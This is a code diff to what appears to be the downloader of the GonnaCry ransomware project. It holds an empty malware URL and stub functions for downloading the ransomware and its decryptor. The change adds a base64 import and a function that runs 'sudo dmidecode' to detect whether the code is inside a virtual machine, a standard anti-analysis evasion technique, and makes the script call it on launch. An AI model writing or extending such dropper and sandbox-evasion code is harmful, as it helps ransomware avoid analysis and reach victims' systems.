@@ -2,6 +2,7 @@ import os
 import subprocess
 import socket
 import requests
+import base64
 
 malware_url = ''
 
@@ -91,5 +92,19 @@ def download_gonnacry():
 def download_decryptor():
     pass
 
+
+def check_VM():
+
+    command = 'sudo dmidecode -t system'
+    proc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    ret = proc.stdout.readlines()
+    print(ret)
+    output = [i.decode('utf-8') for i in ret]
+    if('Virtual Machine' in ''.join(output)):
+        print('INSIDE VM')
+        return True
+    return False
+
 if __name__ == "__main__":
-    pass
+    check_VM()
